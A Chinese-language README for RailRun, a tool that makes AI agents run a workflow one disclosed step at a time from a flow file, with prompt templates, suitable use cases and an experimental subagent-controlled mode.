## RailRun 让流程更可控

大语言模型可以做很多任务。但是在**高确定性场景**（流水线、评测、审计、合规等）下，尤其是**指令长且复杂的任务**里，只靠大语言模型“自觉按流程执行”风险很高。

*模型越弱，越容易不理解上下文里的流程*。
*模型越聪明，越容易在上下文里自己改写流程*。

RailRun 就是为了**解决 Agent 在复杂流程中的“脱轨”，让执行更可控、更稳定、也更容易审计**。

RailRun 的*核心思路*是：
把 Agent 当成“单步执行器”，每次只向 Agent 披露当前这一步指令（*渐进披露*），而不是“流程自主规划器”。

> RailRun 的标准工作方式是：
> 
> 0. Agent 把流程描述文件的路径告知工具；
> 1. 工具解析流程描述文件成为一个控制流 ，并返回第一个步骤节点；
> 2. Agent 执行步骤；
> 3. Agent 调用工具；
> 4. 工具自动移动到下一个步骤节点，并返回这个步骤的内容；
> 5. 回到 `2. Agent 执行步骤`，开始下一个循环

在 RailRun 的机制下，Agent 看不到完整流程，自然也就无法擅自改写流程。

## 快速试用

下载zip文件并解压

   - [最新文件](https://raw.githubusercontent.com/ray306/RailRun/main/install/railrun2016.05.17.zip)

### Prompt 标准写法：

```
/RailRun {{这里填写流程描述文件的名称（如果不在工作区根目录，请填写完整路径）}}
[如果有补充信息，请写在这里]
```

### Prompt 示例 A：（已安装 Skill）

```text
/RailRun examples\simple_todo_flow.arp
我明天得交论文。
```

### Prompt 示例 B：（未安装 Skill）

```text
请读取 `xxx\railrun\SKILL.md` 并按其中说明执行。
流程文件：examples\simple_todo_flow.arp
补充信息：我明天得交论文。
```

（如果没有被安装为Skill，需要把 `/RailRun` 替换为 `xxx\railrun\SKILL.md`，让 Agent 了解 RailRun 的指令。）

---

### 编写流程文件

你可以参考 `PROTOCOL.md` 与 `examples` 目录，自行或借助 AI 把任务流程写成 `arp` 文件。记得检查流程是否符合预期。

你也可以直接使用描述流程的 `md`/`txt` 文件路径 （`/RailRun {{ md/ txt 文件路径}}`）。RailRun 会先尝试转写再执行。*但这种方式无法保证一定被正确解析*。关键流程建议使用标准 `arp`。

## 什么时候适合用

- Agent 在复杂流程里抢跑（没执行完当前步骤就提前给结论）
- Agent 擅自改写步骤顺序（流程漂移）
- 同样输入多次执行，路径不一致（非确定性）
- 流程错误的成本高

以下场景通常不值得强上：

- 目标本身是发散探索，不追求路径稳定
- 任务错误代价很低，复盘价值也低
- 当前最紧迫问题不是流程失控

---

## 你能获得什么

- 在复杂流程中更少跳步、自动切换分支。
- 同类输入下更稳定的执行路径。
- 出问题时可定位：卡在第几步、因为什么规则被阻断。
- 流程可回放，便于审计和复盘。

## 你不需要关心什么

- 不需要记任何命令参数。
- 不需要手动管理每一步的推进细节。
- 不需要理解底层状态机实现。

这些都会被 RailRun 自动完成。

## RailRun & Harness

RailRun 可嵌入 Harness 的执行控制层，专门处理“执行确定性”问题。

- Harness：组织并运行 agent 系统
- RailRun：保证系统按轨道运行

如果说 Harness 负责把系统跑起来，那 RailRun 负责让系统始终沿着轨道跑下去。

## 【实验性功能】

我们提供了一个实验性功能（需要 Codex 等支持子智能体的环境），采用**智能体协同**控制模型：

> 执行流由一个专门的“流程控制子智能体 (Flow Control Subagent)”掌控；
> 主 Agent 处于信息盲区，绝不直接读取任务描述文件；
> 流程由子智能体对主 Agent 进行渐进式披露（每次一步）；
> 主 Agent 每次只执行当前看到的步骤；
> 执行完成后，主 Agent 将执行结果反馈给子智能体，由子智能体智能分析并披露下一步。

Prompt 标准写法（注意文件名包含方括号）：
```
请读取 `[EXP] Subagent.md` 的指令，将 {{流程描述文件的路径}} 作为参数。

[如果有补充信息，请写在这里]
```

这个做法可以更简单地编写流程，并在执行中获得更高的灵活性。但也会破坏执行的确定性，因此需要谨慎使用，或者在确定性要求不高的场景中使用。
